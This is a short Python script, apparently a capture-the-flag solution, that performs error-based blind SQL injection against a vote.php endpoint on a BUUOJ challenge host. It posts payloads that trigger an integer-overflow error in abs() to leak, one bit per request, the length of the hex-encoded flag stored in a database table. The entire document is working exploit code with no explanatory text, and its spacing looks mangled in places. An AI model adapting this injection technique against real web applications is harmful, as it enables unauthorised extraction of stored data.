import  requests

  url  =  "http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php" 
  l  =  0 
  for  n  in  range ( 16 ): 
    payload  =  f 'abs ( case (length (hex ((select (flag) from (flag)))) & {1 << n}) when (0) then (0) else (0x8000000000000000) end) ' 
    data  =  { 
        ' id '  :  payload 
    }

    r  =  requests . post ( url = url ,  data = data ) 
    print ( r . text ) 
    if  'occurred'  in  r . text : 
        l  =  l | 1 << n

  print ( l )
